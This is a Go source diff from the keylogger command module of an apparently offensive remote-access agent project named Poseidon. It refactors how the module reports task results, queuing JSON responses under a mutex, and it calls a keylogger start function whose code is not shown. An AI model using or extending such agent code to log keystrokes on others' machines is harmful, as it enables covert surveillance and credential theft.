@@ -1,28 +1,42 @@
 package keylog
 
 import (
+	"encoding/json"
 	"fmt"
+	"sync"
 
 	"github.com/xorrior/poseidon/pkg/commands/keylog/keystate"
+	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
 //Run - Function that executes the shell command
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
+var mu sync.Mutex
 
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = task
+//Run - Function that executes the shell command
+func Run(task structs.Task) {
 
-	err := keystate.StartKeylogger(task, threadChannel)
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
+
+	err := keystate.StartKeylogger(task)
 
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
-
-	tMsg.TaskResult = []byte(fmt.Sprintf("Started keylogger."))
-	threadChannel <- tMsg
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Started keylogger.")
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
